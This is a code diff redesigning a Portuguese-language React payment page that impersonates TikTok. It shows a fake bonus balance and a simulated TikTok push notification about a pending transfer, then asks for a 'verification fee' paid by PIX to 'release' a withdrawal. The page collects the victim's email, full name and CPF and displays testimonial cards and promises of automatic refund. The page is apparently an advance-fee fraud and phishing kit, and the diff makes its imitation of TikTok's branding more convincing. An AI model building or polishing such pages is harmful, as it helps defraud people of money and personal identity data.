@@ -1,7 +1,7 @@
 import { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { trackTikTokEvent } from "@/lib/tiktok-tracking";
-import { CheckCircle2, Star, User, Loader2, Copy, Check } from "lucide-react";
+import { CheckCircle2, Star, Loader2, Copy, Check, Shield, Zap, CreditCard } from "lucide-react";
 import { QRCodeSVG } from "qrcode.react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -36,10 +36,75 @@ const testimonials = [
   },
 ];
 
+const PushNotification = ({
+  show,
+  exiting,
+  isIOS,
+  onDismiss,
+}: {
+  show: boolean;
+  exiting: boolean;
+  isIOS: boolean;
+  onDismiss: () => void;
+}) => {
+  if (!show) return null;
+  return (
+    <div
+      className="fixed z-[9999] cursor-pointer"
+      onClick={onDismiss}
+      style={{
+        animation: exiting
+          ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
+          : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
+        top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
+        left: isIOS ? "6px" : "12px",
+        right: isIOS ? "6px" : "12px",
+      }}
+    >
+      {isIOS ? (
+        <img
+          src={notifIos}
+          alt="Transferência pendente"
+          className="w-full max-w-md mx-auto rounded-[22px]"
+          style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
+          loading="eager"
+          decoding="async"
+        />
+      ) : (
+        <div
+          className="rounded-2xl p-4 mx-auto max-w-md"
+          style={{
+            fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
+            background: "#2a2a2e",
+            boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
+          }}
+        >
+          <div className="flex items-center gap-2 mb-2">
+            <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
+            <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
+            <span className="text-[11px] text-white/35 mx-0.5">•</span>
+            <span className="text-[11px] text-white/35">agora</span>
+          </div>
+          <div className="flex items-start gap-3">
+            <div className="flex-1 min-w-0">
+              <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
+              <p className="text-[13px] text-white/70 leading-snug">
+                Transferência no valor de R$ {SALDO.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
+              </p>
+            </div>
+            <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
+          </div>
+        </div>
+      )}
+    </div>
+  );
+};
+
 const Pagamento = () => {
   useEffect(() => {
     trackTikTokEvent({ event: "AddPaymentInfo", properties: { value: TAX, currency: "BRL" } });
   }, []);
+
   const [email, setEmail] = useState("");
   const [nomeCompleto, setNomeCompleto] = useState("");
   const [cpf, setCpf] = useState("");
@@ -63,9 +128,8 @@ const Pagamento = () => {
       const tipoChave = localStorage.getItem("tiktok_tipo_chave") || "";
       const chavePix = localStorage.getItem("tiktok_chave_pix") || "";
       const utms = getUtms();
-      
+
       const document = cpf.replace(/\D/g, "");
-      // Use phone from PIX key if available
       const phone = tipoChave === "telefone" ? chavePix.replace(/\D/g, "") : "11999999999";
 
       const { data, error } = await supabase.functions.invoke("create-pix-payment", {
@@ -92,7 +156,6 @@ const Pagamento = () => {
           qr_code_base64: data.qr_code_base64,
           transaction_id: data.transaction_id,
         });
-        // Show push notification
         setShowNotification(true);
         setTimeout(() => setExitingNotification(true), 5000);
         setTimeout(() => setDismissNotification(true), 5400);
@@ -122,130 +185,122 @@ const Pagamento = () => {
 
   const isFormValid = email.trim() && nomeCompleto.trim() && cpf.replace(/\D/g, "").length === 11;
 
+  const handleDismissNotification = () => {
+    setExitingNotification(true);
+    setTimeout(() => setDismissNotification(true), 400);
+  };
 
   return (
-    <div className="flex min-h-screen flex-col bg-gray-50 relative">
-      {/* Simulated Push Notification - appears after PIX generation */}
-      {showNotification && !dismissNotification && (
-        <div
-          className="fixed z-[9999] cursor-pointer"
-          onClick={() => {
-            setExitingNotification(true);
-            setTimeout(() => setDismissNotification(true), 400);
-          }}
-          style={{
-            animation: exitingNotification
-              ? "notifSlideUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards"
-              : "slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1)",
-            top: isIOS ? "env(safe-area-inset-top, 0px)" : "12px",
-            left: isIOS ? "6px" : "12px",
-            right: isIOS ? "6px" : "12px",
-          }}
-        >
-          {isIOS ? (
-            <img
-              src={notifIos}
-              alt="Transferência pendente"
-              className="w-full max-w-md mx-auto rounded-[22px]"
-              style={{ boxShadow: "0 10px 40px rgba(0,0,0,0.15)" }}
-              loading="eager"
-              decoding="async"
-            />
-          ) : (
-            <div
-              className="rounded-2xl p-4 mx-auto max-w-md"
-              style={{
-                fontFamily: "'Roboto', 'Google Sans', 'Noto Sans', sans-serif",
-                background: "#2a2a2e",
-                boxShadow: "0 6px 24px rgba(0,0,0,0.3)",
-              }}
-            >
-              <div className="flex items-center gap-2 mb-2">
-                <img src={tiktokRound} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
-                <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
-                <span className="text-[11px] text-white/35 mx-0.5">•</span>
-                <span className="text-[11px] text-white/35">agora</span>
-              </div>
-              <div className="flex items-start gap-3">
-                <div className="flex-1 min-w-0">
-                  <p className="text-[14px] font-semibold text-white leading-tight mb-0.5">Transferência pendente</p>
-                  <p className="text-[13px] text-white/70 leading-snug">
-                    Transferência no valor de R$ {SALDO.toFixed(2).replace(".", ",")} aguardando pagamento da taxa de liberação.
-                  </p>
-                </div>
-                <img src={tiktokRound} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
-              </div>
-            </div>
-          )}
-        </div>
-      )}
+    <div className="flex min-h-screen flex-col relative" style={{ background: "#f8f8f8" }}>
+      <PushNotification
+        show={showNotification && !dismissNotification}
+        exiting={exitingNotification}
+        isIOS={isIOS}
+        onDismiss={handleDismissNotification}
+      />
 
-      {/* Top banner */}
-      <div className="bg-primary py-3 text-center">
-        <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
+      {/* TikTok-style header */}
+      <div style={{ background: "#161823" }} className="px-4 py-3 flex items-center justify-between">
+        <img src={tiktokLogo} alt="TikTok" className="h-6" loading="eager" decoding="async" style={{ filter: "brightness(0) invert(1)" }} />
+        <div className="flex items-center gap-2">
+          <div className="flex items-center gap-1.5 px-3 py-1 rounded-full" style={{ background: "rgba(255,255,255,0.1)" }}>
+            <Shield className="h-3 w-3" style={{ color: "#25F4EE" }} />
+            <span className="text-[11px] font-medium text-white/80">Pagamento Seguro</span>
+          </div>
+        </div>
       </div>
 
-      <div className="px-4 py-6 space-y-5">
-        {/* Header with logo and saldo */}
-        <div className="flex items-center justify-between">
-          <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
-          <div className="rounded-full border-2 border-transparent px-4 py-1.5" style={{ background: "linear-gradient(#fff, #fff) padding-box, linear-gradient(135deg, #25F4EE, #FE2B54) border-box", borderRadius: 999 }}>
-            <p className="text-[10px] text-gray-500 leading-none">Saldo:</p>
-            <p className="text-sm font-bold text-black">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
+      {/* Balance strip */}
+      <div className="px-4 py-3 flex items-center justify-between" style={{ background: "#fff" }}>
+        <div className="flex items-center gap-3">
+          <div className="h-10 w-10 rounded-xl overflow-hidden shrink-0">
+            <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="eager" decoding="async" />
+          </div>
+          <div>
+            <p className="text-[11px] font-medium" style={{ color: "#999" }}>Saldo disponível</p>
+            <p className="text-lg font-bold" style={{ color: "#161823" }}>
+              R$ {SALDO.toFixed(2).replace(".", ",")}
+            </p>
+          </div>
+        </div>
+        <div className="flex items-center gap-1 px-3 py-1.5 rounded-full" style={{ background: "#E8FAF0" }}>
+          <div className="h-1.5 w-1.5 rounded-full" style={{ background: "#00C853" }} />
+          <span className="text-[11px] font-semibold" style={{ color: "#00C853" }}>Disponível</span>
+        </div>
+      </div>
+
+      <div className="px-4 py-4 space-y-3 max-w-lg mx-auto w-full">
+        {/* Info badges row */}
+        <div className="flex gap-2">
+          <div className="flex-1 flex items-center gap-2 rounded-xl px-3 py-2.5" style={{ background: "#fff" }}>
+            <Zap className="h-4 w-4 shrink-0" style={{ color: "#FE2C55" }} />
+            <span className="text-[11px] font-medium" style={{ color: "#333" }}>Confirmação instantânea</span>
+          </div>
+          <div className="flex-1 flex items-center gap-2 rounded-xl px-3 py-2.5" style={{ background: "#fff" }}>
+            <Shield className="h-4 w-4 shrink-0" style={{ color: "#25F4EE" }} />
+            <span className="text-[11px] font-medium" style={{ color: "#333" }}>Reembolso automático</span>
           </div>
         </div>
 
-        {/* Info banner */}
-        <div className="rounded-xl bg-black px-4 py-3 text-center space-y-0.5">
-          <p className="text-xs font-semibold text-white">Confirmação instantânea</p>
-          <p className="text-[11px] text-gray-400">Reembolso automático via PIX em instantes</p>
+        {/* Product summary */}
+        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
+          <div className="flex items-center justify-between">
+            <div className="flex items-center gap-3">
+              <div className="h-11 w-11 rounded-xl flex items-center justify-center" style={{ background: "#FE2C55" }}>
+                <CreditCard className="h-5 w-5 text-white" />
+              </div>
+              <div>
+                <p className="text-[13px] font-bold" style={{ color: "#161823" }}>Taxa de Verificação</p>
+                <p className="text-[11px]" style={{ color: "#999" }}>Verificação de identidade</p>
+              </div>
+            </div>
+            <p className="text-base font-bold" style={{ color: "#161823" }}>
+              R$ {TAX.toFixed(2).replace(".", ",")}
+            </p>
+          </div>
         </div>
 
-        {/* Product card */}
-        <div className="rounded-2xl bg-white border border-gray-200 p-5">
-          <div className="flex items-center gap-4 mb-4">
-            <div className="h-14 w-14 rounded-2xl overflow-hidden shrink-0">
-              <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="eager" decoding="async" />
-            </div>
+        {/* Form card */}
+        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
+          <p className="text-[13px] font-bold mb-3" style={{ color: "#161823" }}>Seus dados</p>
+
+          <div className="space-y-3">
             <div>
-              <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
-              <p className="text-xs text-green-500 font-medium">Verificação de Identidade</p>
-            </div>
-          </div>
-        </div>
-
-        {/* Identificação */}
-        <div className="rounded-2xl bg-white border border-gray-200 p-5">
-          <div className="flex items-center gap-2 mb-5">
-            <div className="h-8 w-8 rounded-full bg-primary/10 flex items-center justify-center">
-              <User className="h-4 w-4 text-primary" />
-            </div>
-            <h3 className="text-lg font-bold text-black">Identificação</h3>
-          </div>
-
-          <div className="space-y-4">
-            <div>
-              <label className="text-sm font-semibold text-black block mb-2">Email</label>
+              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>EMAIL</label>
               <input
                 type="email"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
-                placeholder="Email"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-base text-black placeholder:text-gray-300 outline-none focus:border-primary"
+                placeholder="seuemail@exemplo.com"
+                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
+                style={{
+                  background: "#f5f5f5",
+                  color: "#161823",
+                  border: "1.5px solid transparent",
+                }}
+                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
+                onBlur={(e) => (e.target.style.borderColor = "transparent")}
               />
             </div>
             <div>
-              <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
+              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>NOME COMPLETO</label>
               <input
                 type="text"
                 value={nomeCompleto}
                 onChange={(e) => setNomeCompleto(e.target.value)}
                 placeholder="Nome e sobrenome"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-base text-black placeholder:text-gray-300 outline-none focus:border-primary"
+                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
+                style={{
+                  background: "#f5f5f5",
+                  color: "#161823",
+                  border: "1.5px solid transparent",
+                }}
+                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
+                onBlur={(e) => (e.target.style.borderColor = "transparent")}
               />
             </div>
             <div>
-              <label className="text-sm font-semibold text-black block mb-2">CPF</label>
+              <label className="text-[11px] font-semibold block mb-1.5" style={{ color: "#666" }}>CPF</label>
               <input
                 type="text"
                 inputMode="numeric"
@@ -259,104 +314,138 @@ const Pagamento = () => {
                   setCpf(formatted);
                 }}
                 placeholder="000.000.000-00"
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-base text-black placeholder:text-gray-300 outline-none focus:border-primary"
+                className="w-full rounded-xl px-4 py-3 text-[14px] outline-none transition-all"
+                style={{
+                  background: "#f5f5f5",
+                  color: "#161823",
+                  border: "1.5px solid transparent",
+                }}
+                onFocus={(e) => (e.target.style.borderColor = "#FE2C55")}
+                onBlur={(e) => (e.target.style.borderColor = "transparent")}
               />
             </div>
           </div>
         </div>
 
-        {/* Método de pagamento */}
-        <div className="rounded-2xl bg-white border border-gray-200 p-5">
-          <h3 className="text-xl font-bold text-black mb-4">Escolha um método de pagamento</h3>
-          <div className="flex items-center justify-between">
+        {/* Payment method */}
+        <div className="rounded-2xl p-4" style={{ background: "#fff" }}>
+          <p className="text-[13px] font-bold mb-3" style={{ color: "#161823" }}>Método de pagamento</p>
+          <div
+            className="flex items-center justify-between rounded-xl px-4 py-3"
+            style={{ background: "#f5f5f5", border: "1.5px solid #25F4EE" }}
+          >
             <div className="flex items-center gap-3">
               <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="eager" decoding="async" />
               <div>
-                <p className="text-sm font-bold text-black">Pagamento via Pix</p>
-                <p className="text-xs text-gray-400">Reembolso imediato.</p>
+                <p className="text-[13px] font-bold" style={{ color: "#161823" }}>PIX</p>
+                <p className="text-[10px]" style={{ color: "#999" }}>Aprovação instantânea</p>
               </div>
+            </div>
+            <div className="h-5 w-5 rounded-full flex items-center justify-center" style={{ background: "#25F4EE" }}>
+              <Check className="h-3 w-3" style={{ color: "#161823" }} />
             </div>
           </div>
         </div>
 
-        {/* Pagar button */}
-        <Button
+        {/* CTA */}
+        <button
           onClick={handlePagar}
           disabled={!isFormValid || loading || !!pixData}
-          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40"
+          className="w-full h-[52px] rounded-2xl text-[15px] font-bold text-white tracking-wide transition-all disabled:opacity-40"
+          style={{
+            background: !isFormValid || loading || !!pixData
+              ? "#ccc"
+              : "linear-gradient(135deg, #FE2C55, #FF004F)",
+            boxShadow: isFormValid && !loading && !pixData
+              ? "0 4px 20px rgba(254, 44, 85, 0.4)"
+              : "none",
+          }}
         >
           {loading ? (
-            <>
-              <Loader2 className="h-5 w-5 mr-2 animate-spin" /> Gerando PIX...
-            </>
+            <span className="flex items-center justify-center gap-2">
+              <Loader2 className="h-5 w-5 animate-spin" /> Gerando PIX...
+            </span>
           ) : pixData ? (
-            "PIX Gerado ✓"
+            <span className="flex items-center justify-center gap-2">
+              <CheckCircle2 className="h-5 w-5" /> PIX Gerado
+            </span>
           ) : (
             "Liberar Saque"
           )}
-        </Button>
+        </button>
 
-        {/* Inline QR Code */}
+        {/* QR Code result */}
         {pixData && (
-          <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
-            <CheckCircle2 className="h-10 w-10 text-green-500 mx-auto" />
-            <h2 className="text-lg font-bold text-black">PIX Gerado com Sucesso!</h2>
-            <p className="text-sm text-gray-500">Escaneie o QR Code para pagar</p>
+          <div className="rounded-2xl p-5 text-center space-y-4" style={{ background: "#fff" }}>
+            <div className="inline-flex items-center justify-center h-12 w-12 rounded-full mx-auto" style={{ background: "#E8FAF0" }}>
+              <CheckCircle2 className="h-6 w-6" style={{ color: "#00C853" }} />
+            </div>
+            <div>
+              <h2 className="text-base font-bold" style={{ color: "#161823" }}>PIX gerado com sucesso!</h2>
+              <p className="text-[12px] mt-1" style={{ color: "#999" }}>Escaneie o QR Code ou copie o código</p>
+            </div>
 
-            <div className="flex justify-center">
+            <div className="flex justify-center p-4 rounded-xl" style={{ background: "#fafafa" }}>
               <QRCodeSVG
                 value={pixData.qr_code}
-                size={192}
+                size={180}
                 level="M"
-                className="rounded-xl"
+                className="rounded-lg"
               />
             </div>
 
-            <Button
+            <button
               onClick={handleCopyPix}
-              className="w-full h-12 rounded-2xl text-sm font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
+              className="w-full h-12 rounded-xl text-[13px] font-bold text-white transition-all flex items-center justify-center gap-2"
+              style={{ background: "#161823" }}
             >
               {copied ? (
                 <>
-                  <Check className="h-4 w-4 mr-2" /> Copiado!
+                  <Check className="h-4 w-4" style={{ color: "#25F4EE" }} /> Copiado!
                 </>
               ) : (
                 <>
-                  <Copy className="h-4 w-4 mr-2" /> Copiar Código PIX
+                  <Copy className="h-4 w-4" /> Copiar Código PIX
                 </>
               )}
-            </Button>
+            </button>
 
-            <p className="text-xs text-gray-400">
-              Após o pagamento, a confirmação é automática em até 2 minutos.
+            <p className="text-[11px]" style={{ color: "#bbb" }}>
+              Confirmação automática em até 2 minutos após pagamento.
             </p>
           </div>
         )}
 
-
         {/* Testimonials */}
-        <div className="flex gap-4 overflow-x-auto pb-4 -mx-4 px-4">
-          {testimonials.map((t) => (
-            <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
-              <div className="flex items-center gap-3 mb-2">
-                <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
-                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
-                </div>
-                <div>
-                  <p className="text-sm font-bold text-black">{t.name}</p>
-                  <div className="flex gap-0.5">
-                    {Array.from({ length: 5 }).map((_, i) => (
-                      <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
-                    ))}
+        <div className="pt-2">
+          <p className="text-[12px] font-bold mb-3" style={{ color: "#161823" }}>O que estão dizendo</p>
+          <div className="flex gap-3 overflow-x-auto pb-3 -mx-4 px-4" style={{ scrollSnapType: "x mandatory" }}>
+            {testimonials.map((t) => (
+              <div
+                key={t.name}
+                className="min-w-[240px] rounded-2xl p-3.5"
+                style={{ background: "#fff", scrollSnapAlign: "start" }}
+              >
+                <div className="flex items-center gap-2.5 mb-2">
+                  <div className="h-8 w-8 rounded-full overflow-hidden shrink-0">
+                    <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
+                  </div>
+                  <div>
+                    <p className="text-[12px] font-bold" style={{ color: "#161823" }}>{t.name}</p>
+                    <div className="flex gap-0.5">
+                      {Array.from({ length: 5 }).map((_, i) => (
+                        <Star key={i} className="h-2.5 w-2.5 fill-yellow-400 text-yellow-400" />
+                      ))}
+                    </div>
                   </div>
                 </div>
+                <p className="text-[11px] leading-relaxed" style={{ color: "#666" }}>{t.text}</p>
               </div>
-              <p className="text-xs text-gray-500 leading-relaxed">{t.text}</p>
-            </div>
-          ))}
+            ))}
+          </div>
         </div>
 
-        <p className="text-xs text-gray-400 text-center leading-relaxed pt-4 pb-2">
+        <p className="text-[10px] text-center leading-relaxed pb-4" style={{ color: "#bbb" }}>
           Ao finalizar o pagamento você concorda com os termos de uso e privacidade do TikTok.
         </p>
       </div>
